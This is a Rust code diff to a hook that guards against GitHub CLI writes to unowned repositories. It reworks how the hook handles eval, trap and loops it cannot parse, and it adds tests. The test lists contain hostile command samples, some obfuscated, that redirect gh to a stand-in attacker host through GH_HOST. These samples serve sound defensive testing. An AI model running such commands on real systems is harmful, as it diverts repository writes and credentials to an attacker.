@@ -855,9 +855,6 @@ struct GhHostEnv {
     /// The whole command, raw — heredoc bodies included, which the segment
     /// list strips. Read only for a `source`/`.` fed by a heredoc.
     raw_command: String,
-    /// Whether nothing in [`Self::raw_command`] can have replaced a known
-    /// tool, asked at the first tool-init `eval` (each ask scans the command).
-    tools_trusted: std::cell::OnceCell<bool>,
 }
 
 impl GhHostEnv {
@@ -880,7 +877,6 @@ impl GhHostEnv {
             allexport: false,
             inherited,
             raw_command: String::new(),
-            tools_trusted: std::cell::OnceCell::new(),
         }
     }
 
@@ -1117,22 +1113,7 @@ impl GhHostEnv {
         // Past the nesting cap its words go unread, so the host is unknown
         // (#1073 review I-d).
         if command == Some("eval") {
-            // A tool-init substitution (`$(ssh-agent -s)`, `$(brew shellenv)`)
-            // prints exports and hooks but never a `GH_HOST` or `GH_REPO`
-            // (cameronsjo/cadence-hooks#1172); its exact head only, and only
-            // when nothing in the command could have replaced the tool.
-            let operands: Vec<&String> = rest[1..]
-                .iter()
-                .skip_while(|word| word.as_str() == "--")
-                .collect();
-            let plain_tool_init = !segment.contains(['\'', '\\'])
-                && cadence_hooks_core::shell::eval_is_tool_init(&operands)
-                && *self.tools_trusted.get_or_init(|| {
-                    !cadence_hooks_core::push::may_redefine_known_commands(&self.raw_command)
-                });
-            if !plain_tool_init {
-                self.observe_nested(&rest[1..].join(" "), depth);
-            }
+            self.observe_nested(&rest[1..].join(" "), depth);
         }
         // A `trap` action runs later in this shell, so it is read like an
         // `eval` string (#1073 review). `trap -p`, `trap -l` and `trap - SIG`
@@ -1221,20 +1202,17 @@ impl GhHostEnv {
     }
 
     /// Observe a script this shell will run from a string (`eval`, a `trap`
-    /// action). Past [`MAX_EVAL_DEPTH`] its words go unread, and a command word
-    /// built by an expansion (`eval "$(…)"`, `eval "$X"`) is text this walk
-    /// never sees — both are unresolved.
+    /// action). Past [`MAX_EVAL_DEPTH`] its words go unread, so the value is
+    /// unresolved. A command word built by an expansion (`eval "$(…)"`,
+    /// `eval "$X"`) is text this walk never sees, so it is skipped: the guard
+    /// judges the hosts it did read (cadence-ecosystem ADR-0046 rule 3).
     fn observe_nested(&mut self, script: &str, depth: usize) {
         if depth >= MAX_EVAL_DEPTH {
             self.add_unresolved();
             return;
         }
         for inner in command_segments(script) {
-            if segment_invokes_gh(&inner) {
-                continue;
-            }
-            if command_word_is_dynamic(&inner) {
-                self.add_unresolved();
+            if segment_invokes_gh(&inner) || command_word_is_dynamic(&inner) {
                 continue;
             }
             self.observe_depth(&inner, depth + 1);
@@ -3845,6 +3823,7 @@ impl Check for GhWriteGuard {
                 .expect("pattern should compile")
         });
         let may_loop = LOOP_WORD.is_match(command);
+        let mut unread_loop = false;
         let analysis = if may_loop {
             loop_analysis::analyze_gh_loops(command)
         } else {
@@ -4060,15 +4039,11 @@ impl Check for GhWriteGuard {
                 // All looped gh commands are read-only — allow
             }
             LoopAnalysis::ParseFailed => {
-                // Regex fallback when AST parser can't handle the syntax
-                let stripped = strip_quotes(command);
-                if LOOP_PATTERN.is_match(&stripped) {
-                    return CheckResult::block(
-                        "🚫 git-guardrails: gh command in loop — cannot verify targets\n   \
-                         Fix: run each gh command individually with `-R owner/repo` (for \
-                         `gh api`, a literal `repos/<owner>/<repo>/…` path)",
-                    );
-                }
+                // The loop parser could not read the command (past its byte
+                // cap, say). A loop is not refused for that (cadence-ecosystem
+                // ADR-0046 rule 3): each write segment is judged below, and
+                // the loop gets a nudge naming the fix.
+                unread_loop = LOOP_PATTERN.is_match(&strip_quotes(command));
             }
             LoopAnalysis::NoLoops => {} // Continue to write detection
         }
@@ -4121,8 +4096,59 @@ impl Check for GhWriteGuard {
         }
 
         // No write segments, or every write segment targets an owned repo.
+        // Strict loops refuse every looped write without `-R` (#44), read
+        // loop or not; a `GH_REPO` does not count there, as it does not when
+        // the loop parser reads the loop. Otherwise a write that named no
+        // target at all was judged on the repo its directory resolves to:
+        // say so.
+        if unread_loop {
+            if judged.write_without_dash_r
+                && std::env::var("CADENCE_GH_STRICT_LOOPS").is_ok_and(|v| v == "1")
+            {
+                return CheckResult::block_structured(
+                    format!("🚫 git-guardrails: {UNREAD_LOOP_STRICT}\n   Fix: {UNREAD_LOOP_FIX}"),
+                    BlockMetadata {
+                        rule_id: "gh-write-loop-missing-repo".to_string(),
+                        fix: UNREAD_LOOP_FIX.to_string(),
+                        allowed_owners: allowed_display_list(&allowed_owners, &allowed_repos),
+                        severity: "error",
+                    },
+                );
+            }
+            if judged.untargeted_write {
+                return CheckResult::nudge(UNREAD_LOOP_NUDGE);
+            }
+        }
         CheckResult::allow()
     }
+}
+
+/// The fix for a gh write without a target in a loop the loop parser could
+/// not read.
+const UNREAD_LOOP_FIX: &str = "give every gh write in the loop `-R owner/repo` (for `gh api`, a literal \
+     `repos/<owner>/<repo>/…` path)";
+
+/// The strict-loops block for that write.
+const UNREAD_LOOP_STRICT: &str = "gh write without -R in a loop the guard could not parse \
+     (CADENCE_GH_STRICT_LOOPS=1)";
+
+/// The nudge for that write: it was judged one segment at a time, on the repo
+/// its directory resolves to, without the loop gate.
+const UNREAD_LOOP_NUDGE: &str = "⚠️  git-guardrails: gh write without -R in a loop the guard \
+     could not parse — it was checked on its own, against the repo its directory resolves to\n   \
+     Verify: give every gh write in the loop `-R owner/repo` (for `gh api`, a literal \
+     `repos/<owner>/<repo>/…` path)";
+
+/// Whether a gh write segment spells its target in its own words: a literal
+/// `repos/<owner>/<repo>/…` path for `gh api`, and otherwise a `-R`/`--repo`
+/// or a `gh repo` positional ([`segment_lacks_explicit_target`]). Without
+/// one, gh writes to a `GH_REPO` it reads, else to the repo its directory
+/// resolves to.
+fn write_spells_its_target(segment: &str) -> bool {
+    if gh_api_endpoint(segment).is_some() {
+        return api_literal_repo_target(segment).is_some();
+    }
+    !segment_lacks_explicit_target(segment)
 }
 
 /// Bytes of script [`command_segments`] may read across every reading of one
@@ -4170,6 +4196,11 @@ struct WriteJudgments {
     seen: std::collections::HashSet<[String; 4]>,
     /// Distinct directories besides the whole-command one judged so far.
     dirs: Vec<std::rc::Rc<str>>,
+    /// A gh write was judged with no `-R` or literal api path
+    /// ([`write_spells_its_target`]).
+    write_without_dash_r: bool,
+    /// Such a write had no `GH_REPO` either, inline or exported earlier.
+    untargeted_write: bool,
 }
 
 /// The block for a command whose writes run in more than
@@ -4551,6 +4582,16 @@ fn judge_write_segments(
             }
             // `repos/<owner>/<repo>` api write — fall through to the
             // existing per-segment ownership check below.
+        }
+
+        // Read by the unread-loop verdict in `run`.
+        if !write_spells_its_target(&segment) {
+            judged.write_without_dash_r = true;
+            if inline_gh_repo(&segment).is_none()
+                && gh_repo_env.candidates().iter().all(String::is_empty)
+            {
+                judged.untargeted_write = true;
+            }
         }
 
         // Judged once per host gh may have inherited: an earlier export
@@ -6098,14 +6139,127 @@ mod tests {
                     .as_ref()
                     .map(|m| m.rule_id.as_str())
                     .unwrap_or("");
-                // Either loop-gate verdict: a missing target, or a loop body
-                // the loop analysis cannot read at all.
-                assert!(
-                    rule == "gh-write-loop-missing-repo"
-                        || msg(&result).contains("gh command in loop — cannot verify targets"),
+                assert_eq!(
+                    rule,
+                    "gh-write-loop-missing-repo",
                     "strict={strict}: {command} was not blocked by the loop gate: {}",
                     msg(&result)
                 );
+            }
+        }
+    }
+
+    #[test]
+    fn a_loop_the_parser_cannot_read_nudges_and_each_write_is_still_judged() {
+        // cadence-ecosystem ADR-0046 rule 3: a command past the loop parser's
+        // byte cap is not refused for being hard to read. Each gh write it
+        // holds is judged on its own, and a write without `-R` gets a nudge.
+        use cadence_hooks_core::Outcome::{Allow, Block};
+        let pad = format!(
+            "\n# {}",
+            "x".repeat(cadence_hooks_core::loop_analysis::MAX_PARSE_BYTES)
+        );
+        for (command, outcome) in [
+            // A read-only loop, or one with no gh at all: nothing to nudge.
+            (
+                "for i in 1 2; do gh pr view $i -R cameronsjo/forgectl; done",
+                Allow,
+            ),
+            ("for b in feat dev; do git push origin $b; done", Allow),
+            // Each write names its target, so the nudge would add nothing.
+            (
+                "for i in 1 2; do gh issue close $i -R cameronsjo/forgectl; done",
+                Allow,
+            ),
+            ("for i in 1 2; do gh issue close $i -R evil/x; done", Block),
+            // No target and no owned checkout to fall back on (`/tmp`).
+            ("for i in 1 2; do gh issue close $i; done", Block),
+            (
+                "while read i; do gh pr merge $i -R evil/x; done < prs",
+                Block,
+            ),
+            // No loop: nothing for the loop gate to say.
+            ("gh pr view 1 -R cameronsjo/forgectl", Allow),
+        ] {
+            let padded = format!("{command}{pad}");
+            let result = run_1344(&padded, "cameronsjo", false);
+            assert_eq!(result.outcome, outcome, "{command}: {}", msg(&result));
+        }
+    }
+
+    #[test]
+    fn an_unread_loop_nudges_or_strictly_blocks_only_a_write_without_a_target() {
+        // Code review of #1469: `CADENCE_GH_STRICT_LOOPS=1` still blocks a
+        // looped write without `-R` when the loop parser gives up. Security
+        // review nit 1: the nudge fires only for a write that names no
+        // target. Run from an owned checkout, where a write without `-R` is
+        // otherwise allowed.
+        use cadence_hooks_core::Outcome::{Allow, Block, Nudge};
+        let owned = origin_checkout("https://github.com/cameronsjo/x.git");
+        let cwd = owned.path().to_string_lossy().into_owned();
+        let pad = format!(
+            "\n# {}",
+            "x".repeat(cadence_hooks_core::loop_analysis::MAX_PARSE_BYTES)
+        );
+        for (command, relaxed, strict) in [
+            ("for i in 1 2; do gh issue close $i; done", Nudge, Block),
+            (
+                "while read i; do gh pr comment $i --body x; done < prs",
+                Nudge,
+                Block,
+            ),
+            // One write without a target is enough.
+            (
+                "for i in 1 2; do gh issue close $i -R cameronsjo/x; gh issue comment $i --body x; done",
+                Nudge,
+                Block,
+            ),
+            // A `-R` or a literal api path names the target.
+            (
+                "for i in 1 2; do gh issue close $i -R cameronsjo/x; done",
+                Allow,
+                Allow,
+            ),
+            (
+                "for i in 1 2; do gh api -X POST repos/cameronsjo/x/issues/$i/comments -f body=x; done",
+                Allow,
+                Allow,
+            ),
+            // So does a `GH_REPO`, except to strict loops, which refuse it
+            // in a loop the parser reads as well.
+            (
+                "for i in 1 2; do GH_REPO=cameronsjo/x gh issue close $i; done",
+                Allow,
+                Block,
+            ),
+            (
+                "export GH_REPO=cameronsjo/x; for i in 1 2; do gh issue close $i; done",
+                Allow,
+                Block,
+            ),
+            // Reads need no target.
+            ("for i in 1 2; do gh pr view $i; done", Allow, Allow),
+        ] {
+            let padded = format!("{command}{pad}");
+            for (strict_loops, want) in [(false, relaxed), (true, strict)] {
+                let mut env = owners_env().to_vec();
+                env.push(("CADENCE_GH_STRICT_LOOPS", strict_loops.then_some("1")));
+                with_env(&env, || {
+                    let result = GhWriteGuard.run(&input_with(&padded, &cwd));
+                    assert_eq!(
+                        result.outcome,
+                        want,
+                        "strict={strict_loops}: {command}: {}",
+                        msg(&result)
+                    );
+                    if want != Allow {
+                        assert!(msg(&result).contains("-R owner/repo"), "{}", msg(&result));
+                    }
+                    if want == Block {
+                        let meta = result.block_metadata.as_ref().expect("structured block");
+                        assert_eq!(meta.rule_id, "gh-write-loop-missing-repo");
+                    }
+                });
             }
         }
     }
@@ -6226,12 +6380,32 @@ mod tests {
             "s/a/b/", "gs/a/b/", "a", "A", "c", "h", "t", "r", "e", "u", "l", "q", "Q", "P", "x",
             "&",
         ] {
-            commands.push(format!(
-                "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/git/refs/heads/$b:{m}; done"
-            ));
+            // Unquoted, `$b:&;` is a syntax error to the loop parser: below.
+            if m != "&" {
+                commands.push(format!(
+                    "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/git/refs/heads/$b:{m}; done"
+                ));
+            }
             commands.push(format!(
                 r#"for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x "$b:{m}"; done"#
             ));
+        }
+        // A loop the parser cannot read (a syntax error) is judged one write
+        // at a time (cadence-ecosystem ADR-0046 rule 3). Each write names an
+        // owned repo in its literal path, so there is nothing to nudge.
+        for unread in [
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/git/refs/heads/$b:&; done",
+            r#"for b in a; do gh api -X DELETE "repos/cameronsjo/forgectl/x/${b"; done"#,
+        ] {
+            for strict in [false, true] {
+                let result = run_1344(unread, "cameronsjo", strict);
+                assert_eq!(
+                    result.outcome,
+                    cadence_hooks_core::Outcome::Allow,
+                    "strict={strict}: {unread}: {}",
+                    msg(&result)
+                );
+            }
         }
         // Every brace form other than a bare name, and the unbraced flags.
         for e in [
@@ -6258,7 +6432,6 @@ mod tests {
             "${(s:,:)b}",
             "${b[1]}",
             "${!b}",
-            "${b",
             "$b[1]",
             "$=b",
             "$~b",
@@ -10209,7 +10382,6 @@ mod tests {
             "trap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap 'export GH_HOS''T=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap -- 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
-            "trap \"$CMD\" DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             // Narrow review I-1: after `--`, a leading dash is the action.
             "trap -- '-x; export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap -- '- ; export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
@@ -10224,14 +10396,34 @@ mod tests {
             "command -p -- export GH_HOST=evil.com; gh issue create -R cameronsjo/x -t a -b b",
             // N-2: a function named as the action.
             "f(){ export GH_HOST=evil.com; }; trap f DEBUG; gh issue create -R cameronsjo/x -t a -b b",
-            // I-3: eval of an expansion.
-            "eval \"$(printf 'export GH_HOS%s=evil.com' T)\"; gh issue create -R cameronsjo/x -t a -b b",
-            "eval \"$X\"; gh issue create -R cameronsjo/x -t a -b b",
-            "eval `cat f`; gh issue create -R cameronsjo/x -t a -b b",
+            // Code review of #1471: an `eval` of a variable the command
+            // assigns in plain text reads that text, and a trap action whose
+            // command word is literal `export` sets GH_HOST from a value only
+            // the shell knows. Neither is an unread expansion.
+            "X='export GH_HOST=evil.example'; eval \"$X\"; gh pr comment 1 -R cameronsjo/x --body x",
+            "trap \"export GH_HOST=$H\" DEBUG; gh pr comment 1 -R cameronsjo/x --body x",
         ] {
             run_case(&mut bad, command, true);
         }
+        // The visible assignment is read, not only flagged as a mention: the
+        // block names the host it sets.
+        with_env(&owners_env(), || {
+            let result = GhWriteGuard.run(&input_with(
+                "X='export GH_HOST=evil.example'; eval \"$X\"; gh pr comment 1 -R cameronsjo/x --body x",
+                "/tmp",
+            ));
+            if !msg(&result).contains("evil.example/cameronsjo/x") {
+                bad.push(format!("eval of a visible assignment: {}", msg(&result)));
+            }
+        });
         for command in [
+            // An `eval` or `trap` of an expansion is text the guard cannot
+            // read, so it steps aside (cadence-ecosystem ADR-0046 rule 3).
+            "eval \"$(direnv export bash)\"; gh pr comment 1 -R cameronsjo/x --body x",
+            "eval \"$(ssh-agent -s)\"; gh pr comment 1 -R cameronsjo/x --body x",
+            "eval \"$X\"; gh issue create -R cameronsjo/x -t a -b b",
+            "eval `cat f`; gh issue create -R cameronsjo/x -t a -b b",
+            "trap \"$CMD\" DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "tmp=$(mktemp); trap 'rm -f \"$tmp\"' EXIT; gh issue comment 1 -R cameronsjo/x --body-file \"$tmp\"",
             "trap cleanup EXIT; gh issue create -R cameronsjo/x -t a -b b",
             "trap - EXIT; trap -p; gh issue create -R cameronsjo/x -t a -b b",
